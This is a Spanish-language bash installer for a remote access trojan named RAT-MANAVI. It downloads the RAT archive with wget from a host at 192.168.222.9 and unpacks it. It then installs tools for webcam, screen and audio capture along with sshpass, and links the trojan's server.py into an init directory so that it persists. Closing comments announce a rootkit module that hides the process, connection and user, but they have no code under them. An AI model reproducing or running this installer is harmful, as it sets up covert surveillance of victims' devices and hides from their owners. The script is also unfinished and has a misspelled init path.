#!/bin/bash

ping -c 4 www.google.com > /dev/null 2>>/dev/null

if [ $? != 0 ]
then 
	echo "Necesitas internet para continuar..."
	echo "Saliendo del instalador."
	exit
else
	echo "Podeis continuar con la instalacion."
	if [ ! -d /usr/local/manavi ]
	then
		echo "Creando directorio de instalacion..."
		mkdir /usr/local/manavi
	else
		echo "Teneis lo necesario para continuar"
	fi
fi

if [ ! -f RAT-MANAVI.tar.gz ]
then
	echo "Descargando el paquete necesario para la instalacion..."
	wget 192.168.222.9/RAT/RAT-MANAVI.tar.gz
	echo "Paquete descargado"
else
	echo "Como ya tienes el paquete continuamos con la instalacion."
fi

echo "Descomprimiendo el paquete..."
tar xvzf RAT-MANAVI.tar.gz -C /usr/local/manavi
cd /usr/local/manavi/RAT-MANAVI/

#Se instalan todas las dependencias
apt-get -y install imagemagick 
apt-get -y install streamer 
apt-get -y install alsa-utils 
apt-get -y install alsa-oss 
apt-get -y install 4l2ucp 
apt-get -y install sqlite3 
apt-get -y install python-dev  
apt-get -y install linux-headers-$(uname -r) 
apt-get -y install sshpass

#Se habilita el modulo.
modprobe snd_pcm_oss 

#Agregar a init.d script server
ln -s /usr/local/manavi/server.py /etc/ini.t/server.py

#Intalar modulo de rootkit
cd /usr/local/manavi/RAT-MANAVI/


#Ocultar proceso

#Ocultar conexion

#Ocultar usuario

